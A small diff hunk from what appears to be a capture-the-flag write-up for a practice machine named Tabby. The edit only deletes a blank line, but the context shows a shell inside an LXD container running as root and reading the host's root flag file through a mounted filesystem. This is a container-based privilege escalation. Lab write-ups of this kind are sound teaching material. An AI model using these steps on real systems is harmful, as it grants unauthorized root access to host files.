@@ -187,5 +187,4 @@ ash@tabby:/dev/shm$ lxc exec alpine-container /bin/sh
 uid=0(root) gid=0(root)   
 ~ # cat /mnt/root/root/root.txt
 309d17dcbfbe5ee7dba81f0079b10982
-
 ```
